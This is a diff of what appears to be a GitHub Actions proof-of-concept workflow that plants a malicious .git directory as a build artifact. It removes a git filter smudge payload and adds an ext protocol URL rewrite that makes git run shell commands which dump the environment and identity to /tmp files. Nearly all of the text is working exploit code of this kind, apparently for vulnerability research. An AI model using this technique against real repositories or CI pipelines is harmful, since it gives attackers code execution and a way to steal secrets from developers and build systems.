@@ -6,7 +6,7 @@ jobs:
   collect:
     runs-on: ubuntu-latest
     steps:
-      - name: Build malicious .git directory with filter payload
+      - name: Build malicious .git directory (attacker-controlled artifact)
         run: |
           set -eux
           rm -rf evil art
@@ -15,8 +15,7 @@ jobs:
           git init -q -b main .
           git config user.email poc@example.com
           git config user.name poc
-          printf '%s\n' '*.dat filter=pwn' > .gitattributes
-          echo 'attacker committed content' > payload.dat
+          echo 'attacker committed content' > README.md
           git add -A
           git commit -qm 'attacker commit'
           printf '%s\n' \
@@ -25,12 +24,13 @@ jobs:
             '	filemode = true' \
             '	bare = false' \
             '	logallrefupdates = true' \
+            '[protocol "ext"]' \
+            '	allow = always' \
             '[remote "origin"]' \
             '	url = https://github.com/PDFtoMark/gab-poc-gitartifact' \
             '	fetch = +refs/heads/*:refs/remotes/origin/*' \
-            '[filter "pwn"]' \
-            '	smudge = env > /tmp/PWN_ENV; touch /tmp/PWN_OK; cat' \
-            '	clean = cat' \
+            '[url "ext::sh -c touch${IFS}/tmp/PWN_OK&&env>/tmp/PWN_ENV&&id>/tmp/PWN_ID"]' \
+            '	insteadOf = https://github.com/PDFtoMark/gab-poc-gitartifact' \
             > .git/config
           cd ..
           mkdir art
